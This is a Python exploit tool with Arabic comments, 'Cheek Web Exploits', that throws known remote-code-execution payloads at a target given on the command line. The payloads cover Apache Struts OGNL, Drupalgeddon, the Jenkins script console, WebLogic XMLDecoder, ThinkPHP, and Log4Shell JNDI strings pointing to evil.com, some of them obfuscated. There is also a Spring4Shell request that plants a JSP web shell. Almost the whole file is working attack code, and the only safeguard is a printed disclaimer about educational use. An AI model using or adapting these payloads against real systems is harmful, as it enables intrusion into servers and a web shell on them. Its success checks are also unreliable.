#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cheek Web Exploits - استغلالات ويب متقدمة
المبرمج: SayerLinux
الإيميل: SaudiSayer@gmail.com
"""

import requests
import socket
import json
import base64
import urllib.parse
import time
import random
import string
import re
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class WebExploits:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'CheekWebExploit/1.0'})
        self.results = []
    
    def log_result(self, exploit_type, success, details=""):
        """تسجيل نتائج الاستغلال"""
        result = {
            'timestamp': datetime.now().isoformat(),
            'exploit_type': exploit_type,
            'target': self.target,
            'success': success,
            'details': details
        }
        self.results.append(result)
        
        if success:
            print(f"{Colors.GREEN}[+] {exploit_type}: SUCCESS - {details}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[-] {exploit_type}: FAILED{Colors.RESET}")
    
    def apache_struts_exploit(self):
        """استغلال ثغرات Apache Struts الشهيرة"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات Apache Struts...{Colors.RESET}")
        
        # بايتودات Struts الشهيرة
        struts_payloads = [
            # CVE-2017-5638
            "${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#f=@java.lang.Runtime@getRuntime(),#f.exec(\"id\")}",
            # CVE-2018-11776
            "${(#_=#attr['struts.valueStack']).(#context=#_.getContext()).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}",
        ]
        
        headers = {
            'Content-Type': '${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#f=@java.lang.Runtime@getRuntime(),#f.exec(\"id\")}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        try:
            # اختبار CVE-2017-5638
            response = self.session.get(f"http://{self.target}", headers=headers, timeout=10)
            
            if "uid=" in response.text or "gid=" in response.text:
                print(f"{Colors.RED}[!] Apache Struts CVE-2017-5638 مكتشف!{Colors.RESET}")
                self.log_result("Apache Struts", True, "CVE-2017-5638 - RCE مكتشف")
                return True
            
            # اختبار CVE-2018-11776
            test_url = f"http://{self.target}/struts2-showcase/"
            response = self.session.get(test_url, timeout=10)
            
            if response.status_code == 200:
                print(f"{Colors.RED}[!] Apache Struts مكتشف - يمكن اختبار CVE-2018-11776{Colors.RESET}")
                self.log_result("Apache Struts", True, "Struts framework مكتشف - تحقق من CVE-2018-11776")
                return True
                
        except:
            pass
        
        self.log_result("Apache Struts", False, "لا توجد ثغرات Struts واضحة")
        return False
    
    def drupalgeddon_exploit(self):
        """استغلال ثغرات Drupalgeddon"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات Drupalgeddon...{Colors.RESET}")
        
        # التحقق من وجود Drupal
        drupal_indicators = ['/drupal/', '/core/', '/sites/default/']
        
        drupal_found = False
        for indicator in drupal_indicators:
            try:
                response = self.session.get(f"http://{self.target}{indicator}", timeout=5)
                if response.status_code == 200:
                    drupal_found = True
                    break
            except:
                continue
        
        if not drupal_found:
            self.log_result("Drupalgeddon", False, "Drupal غير مكتشف")
            return False
        
        # بايتودات Drupalgeddon
        drupal_payloads = [
            # Drupalgeddon 2 (CVE-2018-7600)
            {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'id'},
            # Drupalgeddon 3 (CVE-2018-7602)
            {'form_id': 'user_pass', '_drupal_ajax': '1', 'name[#post_render][]': 'passthru', 'name[#type]': 'markup', 'name[#markup]': 'id'}
        ]
        
        for payload in drupal_payloads:
            try:
                response = self.session.post(f"http://{self.target}/user/register", data=payload, timeout=10)
                
                if "uid=" in response.text or "gid=" in response.text:
                    print(f"{Colors.RED}[!] Drupalgeddon مكتشف!{Colors.RESET}")
                    self.log_result("Drupalgeddon", True, "RCE مكتشف في Drupal")
                    return True
                    
            except:
                continue
        
        self.log_result("Drupalgeddon", False, "لا توجد ثغرات Drupalgeddon واضحة")
        return False
    
    def jenkins_exploit(self):
        """استغلال ثغرات Jenkins"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات Jenkins...{Colors.RESET}")
        
        # التحقق من وجود Jenkins
        jenkins_paths = ['/jenkins/', '/jenkins/script', '/script', '/scriptText']
        
        jenkins_found = False
        for path in jenkins_paths:
            try:
                response = self.session.get(f"http://{self.target}{path}", timeout=5)
                if "Jenkins" in response.text or "script" in path and response.status_code == 200:
                    jenkins_found = True
                    print(f"{Colors.GREEN}[+] Jenkins مكتشف في: {path}{Colors.RESET}")
                    break
            except:
                continue
        
        if not jenkins_found:
            self.log_result("Jenkins", False, "Jenkins غير مكتشف")
            return False
        
        # بايتودات Jenkins Script Console
        jenkins_payloads = [
            'println "id".execute().text',
            'println "whoami".execute().text',
            'def command = "id"; def proc = command.execute(); println proc.text'
        ]
        
        for payload in jenkins_payloads:
            try:
                response = self.session.post(
                    f"http://{self.target}/script",
                    data={'script': payload},
                    timeout=10
                )
                
                if "uid=" in response.text or "gid=" in response.text:
                    print(f"{Colors.RED}[!] Jenkins Script Console RCE مكتشف!{Colors.RESET}")
                    self.log_result("Jenkins", True, "Script Console RCE مكتشف")
                    return True
                    
            except:
                continue
        
        self.log_result("Jenkins", False, "لا توجد ثغرات Jenkins واضحة")
        return False
    
    def weblogic_exploit(self):
        """استغلال ثغرات Oracle WebLogic"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات Oracle WebLogic...{Colors.RESET}")
        
        # التحقق من وجود WebLogic
        weblogic_paths = ['/console/', '/wls-wsat/', '/_async/', '/uddiexplorer/']
        
        weblogic_found = False
        for path in weblogic_paths:
            try:
                response = self.session.get(f"http://{self.target}{path}", timeout=5)
                if "WebLogic" in response.text or response.status_code == 200:
                    weblogic_found = True
                    print(f"{Colors.GREEN}[+] WebLogic مكتشف في: {path}{Colors.RESET}")
                    break
            except:
                continue
        
        if not weblogic_found:
            self.log_result("WebLogic", False, "WebLogic غير مكتشف")
            return False
        
        # بايتود WebLogic RCE
        weblogic_payload = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                    <java><java version="1.4.0" class="java.beans.XMLDecoder">
                        <object class="java.io.PrintWriter">
                            <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.txt</string>
                            <void method="println"><string>test</string></void>
                        </object>
                    </java></java>
                </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body></soapenv:Body>
        </soapenv:Envelope>"""
        
        try:
            response = self.session.post(
                f"http://{self.target}/wls-wsat/CoordinatorPortType",
                data=weblogic_payload,
                headers={'Content-Type': 'text/xml'},
                timeout=10
            )
            
            if response.status_code == 202:
                print(f"{Colors.RED}[!] WebLogic RCE مكتشف!{Colors.RESET}")
                self.log_result("WebLogic", True, "RCE مكتشف في WebLogic")
                return True
                
        except:
            pass
        
        self.log_result("WebLogic", False, "لا توجد ثغرات WebLogic واضحة")
        return False
    
    def thinkphp_exploit(self):
        """استغلال ثغرات ThinkPHP"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات ThinkPHP...{Colors.RESET}")
        
        # التحقق من وجود ThinkPHP
        thinkphp_paths = ['/index.php', '/thinkphp/', '/tp/']
        
        thinkphp_found = False
        for path in thinkphp_paths:
            try:
                response = self.session.get(f"http://{self.target}{path}", timeout=5)
                if "ThinkPHP" in response.text or "thinkphp" in response.text.lower():
                    thinkphp_found = True
                    break
            except:
                continue
        
        if not thinkphp_found:
            self.log_result("ThinkPHP", False, "ThinkPHP غير مكتشف")
            return False
        
        # ثغرات ThinkPHP الشهيرة
        thinkphp_payloads = [
            # ThinkPHP 5.0.23 RCE
            '/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id',
            # ThinkPHP 5.0.22/5.1.29 RCE
            '/index.php?s=index/\\think\\Request/input&filter=system&data=id',
            # ThinkPHP 5.0.21 RCE
            '/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func&vars[0]=system&vars[1][]=id'
        ]
        
        for payload in thinkphp_payloads:
            try:
                response = self.session.get(f"http://{self.target}{payload}", timeout=10)
                
                if "uid=" in response.text or "gid=" in response.text:
                    print(f"{Colors.RED}[!] ThinkPHP RCE مكتشف!{Colors.RESET}")
                    print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                    self.log_result("ThinkPHP", True, "RCE مكتشف في ThinkPHP")
                    return True
                    
            except:
                continue
        
        self.log_result("ThinkPHP", False, "لا توجد ثغرات ThinkPHP واضحة")
        return False
    
    def apache_log4j_exploit(self):
        """استغلال ثغرة Log4j (Log4Shell)"""
        print(f"{Colors.YELLOW}[*] فحص ثغرة Log4Shell...{Colors.RESET}")
        
        # بايتودات Log4j
        log4j_payloads = [
            '${jndi:ldap://evil.com/a}',
            '${jndi:rmi://evil.com/a}',
            '${jndi:dns://evil.com/a}',
            '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}',
            '${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}'
        ]
        
        # اختبار في رؤوس مختلفة
        headers_list = [
            {'User-Agent': '${jndi:ldap://evil.com/a}'},
            {'X-Api-Version': '${jndi:ldap://evil.com/a}'},
            {'X-Forwarded-For': '${jndi:ldap://evil.com/a}'},
            {'Authorization': '${jndi:ldap://evil.com/a}'},
            {'CF-Connecting_IP': '${jndi:ldap://evil.com/a}'}
        ]
        
        vuln_found = False
        
        for headers in headers_list:
            try:
                response = self.session.get(f"http://{self.target}", headers=headers, timeout=10)
                
                # التحقق من استجابة غير عادية
                if response.status_code >= 500 or response.elapsed.total_seconds() > 5:
                    print(f"{Colors.RED}[!] استجابة غير عادية - قد تكون Log4Shell!{Colors.RESET}")
                    print(f"{Colors.YELLOW}[*] الرأس: {headers}{Colors.RESET}")
                    vuln_found = True
                    break
                    
            except:
                continue
        
        if vuln_found:
            self.log_result("Log4Shell", True, "استجابة غير عادية تشير إلى Log4Shell")
        else:
            self.log_result("Log4Shell", False, "لا توجد مؤشرات Log4Shell واضحة")
        
        return vuln_found
    
    def spring4shell_exploit(self):
        """استغلال ثغرة Spring4Shell"""
        print(f"{Colors.YELLOW}[*] فحص ثغرة Spring4Shell...{Colors.RESET}")
        
        # التحقق من وجود Spring
        spring_indicators = ['/actuator/', '/api/', '/rest/']
        
        spring_found = False
        for indicator in spring_indicators:
            try:
                response = self.session.get(f"http://{self.target}{indicator}", timeout=5)
                if response.status_code == 200:
                    spring_found = True
                    break
            except:
                continue
        
        if not spring_found:
            self.log_result("Spring4Shell", False, "Spring غير مكتشف")
            return False
        
        # بايتود Spring4Shell
        spring_payload = """
        class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=""""
        
        try:
            response = self.session.post(
                f"http://{self.target}/",
                data=spring_payload,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"{Colors.RED}[!] Spring4Shell RCE مكتشف!{Colors.RESET}")
                self.log_result("Spring4Shell", True, "RCE مكتشف في Spring")
                return True
                
        except:
            pass
        
        self.log_result("Spring4Shell", False, "لا توجد ثغرات Spring4Shell واضحة")
        return False
    
    def generate_web_report(self):
        """إنشاء تقرير الاستغلالات المتقدمة"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}=== تقرير استغلالات الويب المتقدمة ==={Colors.RESET}")
        
        successful_exploits = [r for r in self.results if r['success']]
        
        print(f"{Colors.YELLOW}الهدف: {Colors.GREEN}{self.target}{Colors.RESET}")
        print(f"{Colors.YELLOW}الثغرات المتقدمة المكتشفة: {Colors.RED}{len(successful_exploits)}{Colors.RESET}")
        
        if successful_exploits:
            print(f"\n{Colors.RED}[!] تفاصيل الثغرات:{Colors.RESET}")
            for exploit in successful_exploits:
                print(f"  - {exploit['exploit_type']}: {exploit['details']}")
        
        # حفظ التقرير
        report_filename = f"web_exploits_report_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(report_filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, ensure_ascii=False, indent=2)
            print(f"\n{Colors.GREEN}[+] تم حفظ تقرير الاستغلالات في: {report_filename}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[-] فشل حفظ التقرير: {e}{Colors.RESET}")
    
    def run_all_web_exploits(self):
        """تشغيل جميع استغلالات الويب"""
        print(f"{Colors.CYAN}{Colors.BOLD}=== بدء استغلالات الويب المتقدمة لـ {self.target} ==={Colors.RESET}")
        
        exploits = [
            self.apache_struts_exploit,
            self.drupalgeddon_exploit,
            self.jenkins_exploit,
            self.weblogic_exploit,
            self.thinkphp_exploit,
            self.apache_log4j_exploit,
            self.spring4shell_exploit
        ]
        
        for exploit in exploits:
            try:
                exploit()
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}[!] تم إيقاف الاستغلالات بواسطة المستخدم{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}[-] خطأ في {exploit.__name__}: {e}{Colors.RESET}")
                continue
        
        self.generate_web_report()

def main():
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("██╗    ██╗███████╗██████╗ ██████╗ ██╗    ██╗██╗  ██╗")
    print("██║    ██║██╔════╝██╔══██╗██╔══██╗██║    ██║╚██╗██╔╝")
    print("██║ █╗ ██║█████╗  ██████╔╝██║  ██║██║ █╗ ██║ ╚███╔╝ ")
    print("██║███╗██║██╔══╝  ██╔══██╗██║  ██║██║███╗██║ ██╔██╗ ")
    print("╚███╔███╔╝███████╗██████╔╝██████╔╝╚███╔███╔╝██╔╝ ██╗")
    print(" ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝")
    print(f"{Colors.PURPLE}")
    print("    استغلالات الويب المتقدمة")
    print("    Advanced Web Exploits")
    print(f"{Colors.YELLOW}")
    print("المبرمج: SayerLinux")
    print("الإيميل: SaudiSayer@gmail.com")
    print(f"{Colors.RESET}")
    
    if len(sys.argv) != 2:
        print(f"{Colors.RED}[!] الاستخدام: python {sys.argv[0]} <target>{Colors.RESET}")
        sys.exit(1)
    
    target = sys.argv[1]
    
    print(f"{Colors.RED}[!] تحذير: هذه الأداة للأغراض التعليمية والاختبارية فقط!{Colors.RESET}")
    print(f"{Colors.RED}[!] تأكد من أن لديك صلاحية اختبار الهدف: {target}{Colors.RESET}")
    
    try:
        web_exploits = WebExploits(target)
        web_exploits.run_all_web_exploits()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] تم إيقاف الأداة بواسطة المستخدم{Colors.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[!] خطأ غير متوقع: {e}{Colors.RESET}")
        sys.exit(1)

if __name__ == '__main__':
    import sys
    main()